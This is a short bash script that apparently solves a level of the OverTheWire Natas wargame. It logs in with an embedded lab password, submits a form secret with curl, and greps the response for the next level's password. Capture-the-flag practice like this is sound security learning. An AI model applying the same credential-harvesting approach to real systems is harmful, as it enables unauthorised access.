#!/usr/bin/bash

curl -s --keepalive-time 1 -u natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org -s --data "secret=FOEIUWGHFEEUHOFUOIU&submit=submit" | grep -oP '(?<=(natas7 is )).*'